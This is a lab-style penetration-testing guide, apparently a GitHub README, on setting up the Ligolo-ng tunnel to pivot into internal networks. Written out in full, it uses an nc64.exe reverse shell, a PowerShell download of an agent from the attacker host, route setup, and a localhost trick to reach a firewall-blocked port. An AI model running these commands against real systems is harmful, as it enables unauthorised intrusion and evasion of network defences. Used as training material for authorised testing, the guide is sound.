
# Ligolo Setup Guide

## We  got    Agent  and proxy :--

1. Proxy  ⇒  Kali Linux  [ Local pc  ]
2. Agent  ⇒  Target  machines [  Victim ]


 ## Symbols & Notations
- **$** : Turbo User (Non-root user on attacker machine)
- **#** : Root User  (root user on attacker machine)
- **C:\>** : Target Machine (Windows)
- **@** : Reverse Shell of Windows in Attacker End
- **##** : Ligolo-Proxy-Server

## 1 - Place `nc` Binary on Target Machine

Using a Python HTTP server:

```
┌──(turbo㉿kali)-[/opt/Static\ Binaries/Windows\ Binaries]
└─$ python -m http.server 80
```

Access the server from the target machine:

```
http://192.168.1.13
```

---

## 2 - Get a Reverse Shell

Start a listener on port 443:


```bash
$ nc -nlvp 443
```

On the target machine, run:

```powershell
C:\> nc64.exe 192.168.1.13 443 -e cmd.exe
```

After executing this, the reverse shell will be active on the attacker’s listener.

![image](https://github.com/user-attachments/assets/cd48e5b2-5321-46c6-901a-0440aa837b9b)


---

## 3 - Transfer Ligolo Agent to Target Machine

Start a Python HTTP server:

```bash
┌──(turbo㉿kali)-[/opt/Static\ Binaries/Ligolo_ng/win]
└─$ python -m http.server 80
```

On the reverse shell, download the agent:

```powershell
@ powershell Invoke-WebRequest "http://192.168.1.13/agent.exe" -OutFile "C:\Users\Public\agent.exe"
```

Alternative method:

```powershell
@ iwr -uri http://192.168.45.13/agent.exe -Outfile agent.exe
```

Or manually visit:

```
http://192.168.1.13
```

---

## 4 - Start Ligolo Proxy Server on Attacker Machine

Run the following as **root**:
Run on Attacker Box (Kali) with root User (192.168.1.13)

• Create the Ligolo tunnel interface on the attacker system
```
# ip tuntap add user turbo mode tun ligolo
```
![image](https://github.com/user-attachments/assets/b3b79fc3-9e1e-48d6-88c5-eb418294039c)

• Created Ligolo tunnel interface to active
```
# ip link set ligolo up
```
![image](https://github.com/user-attachments/assets/762332d3-7a3d-47bf-8d1e-991dd8c6fc23)

```
# cd /opt/Static\ Binaries/Ligolo_ng/win
```
```
# chmod +x proxy
```

Start the local proxy server:

```
# ./proxy -selfcert -laddr 0.0.0.0:80
```
Other Method
```
# ligolo-proxy -selfcert -laddr 0.0.0.0:80
```

---

## 5 - Start Ligolo Agent on Target Machine

### On Windows

```
@ agent.exe -connect 192.168.1.13:80 -ignore-cert
```

### On Linux

```
@ agent -connect 192.168.1.13:80 -ignore-cert
```

---

## 6 - Configure Network Routing on Attacker Machine

Check agent session:

```
## ligolo-ng » session
```


![image](https://github.com/user-attachments/assets/699f05da-9f93-496c-806e-ab5b21b56cf2)

```
## [Agent : root@webserver] » ifconfig
```
![image](https://github.com/user-attachments/assets/043d0a4f-f96e-4e72-8636-683fb3559ad5)


Add an internal network route:

```
# ip route add 192.168.2.0/24 dev ligolo
```

Verify routes:

```
# route -n
# ip route
```
![image](https://github.com/user-attachments/assets/c7320a87-f891-4583-897c-3ca4e99b7cc6)


Check active tunnels:

```
## [Agent : root@webserver] » tunnel_list
```
![image](https://github.com/user-attachments/assets/79c4ddc4-a94e-476e-bd21-42230fae5ce6)


---

## 7 - Visit Services from Attacker Machine

- **http://192.168.1.20** - Bind in port 80 Apache page
- **http://192.168.2.10** - Bind to site2

  ![image](https://github.com/user-attachments/assets/beec36e4-a763-4bba-bc47-c6ddc01b4430)

- **http://127.0.0.1** - Binnd to site1

---

## 8 - Access Agent’s Local Ports ( 127.0.0.1 )

Link :-  https://github.com/nicocha30/ligolo-ng/wiki/Localhost

 If you need to access the local ports of the currently connected agent, there's a
"magic" CIDR hardcoded in Ligolo-ng: 240.0.0.0/4
This is an unused IPv4 subnet. If you query an IP address on this subnet, Ligolo-
ng will automatically redirect traffic to the agent's local IP address (127.0.0.1).
```
# ip route add 240.0.0.1/32 dev ligolo
```

```

# ip route
```
![image](https://github.com/user-attachments/assets/1af2c3e5-fc79-4ecf-abe2-e3c0e61b1e93)

Visit from the attacker machine:

```
http://240.0.0.1
```
![image](https://github.com/user-attachments/assets/b4199875-dd13-4a9a-abff-8947c5c237ec)

Scan the network:

```
# nmap -v -p- -sT 240.0.0.1
```
⇒ When  we Scan  inside the  Target Machine  withthe help of  this  ip  (240.0.0.1) Port no 80 Open 

![image](https://github.com/user-attachments/assets/4f41d77a-ad29-45b0-9a9b-2fae09d4ed21)

⇒ When we  Scan  Outside of the Target Machine  withthe help of ip ( 192.168.1.20 ) Port no 80 Open 

![image](https://github.com/user-attachments/assets/685f1b85-f957-4014-aaa9-d6352576b96c)
 
========================================================

## Firewall in windows :- 
 
 In inbound Rule Block port no 80  which is not listning in nmap output ----

 ![image](https://github.com/user-attachments/assets/60ed9d5e-682d-4dbc-ab94-0da41fda42d1)


⇒ Port no  80 Block  By Firewall  they can't show in nmap output :--
 
 ![image](https://github.com/user-attachments/assets/ce723713-010e-4f0f-a159-908844a8956a)

 
 ⇒ port no 80  is show  in  local host Binding   127.0.0.1  [  240.0.0.1 ]

 ![image](https://github.com/user-attachments/assets/8c99d7c9-dc63-4dd5-a14e-ab7dec0fe8c4)

 
 
 
 

 

